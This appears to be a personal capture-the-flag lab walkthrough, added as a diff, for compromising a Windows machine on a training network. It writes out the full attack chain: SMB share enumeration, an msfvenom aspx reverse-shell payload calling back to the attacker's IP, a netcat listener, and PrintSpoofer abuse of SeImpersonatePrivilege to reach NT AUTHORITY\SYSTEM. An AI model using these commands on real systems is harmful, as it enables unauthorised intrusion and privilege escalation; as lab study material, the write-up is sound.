@@ -1,0 +1,58 @@
+10.10.241.105
+
+1)nmap scan and found 2 web servers 80 and 49663
+  80 is a default windows server page
+  49663 is empty
+
+2)smbclient to the machine
+  smbclient -L \\\\10.10.241.105\\shares
+  found a directory nt4wrksv
+
+  smbclient \\\\10.10.241.105\\nt4wrksv
+  it is readable and writable
+  put a test file and tried to access it through the browser
+  http://10.10.241.105:49663/nt4wrksv/test.txt
+  and it worked 
+
+3)create a payload for windows with aspx extension in msfvenom
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.170.136 LPORT=53 -f aspx -o rev.aspx
+
+4)upload the payload to smbclient
+  put rev.aspx
+
+  setup a netcat listener in port 53
+  nc -nlvp 53
+  open the payload through web browser 
+  we have a reverse shell
+
+5)check whoami
+  c:\windows\system32\inetsrv>whoami /priv
+  whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+6)We can see the SetImpersonatePrivilage is enabled and we can use that to privesc
+
+7)download PrintSpoofer.exe  
+  setup a python server 
+
+
+8)upload the PrintSpoofer.exe using smbclient 
+
+  from the reverse shell run
+  PrintSpoofer.exe -i -c cmd 
+
+  we have succesfully became NT-Authority 
+
+
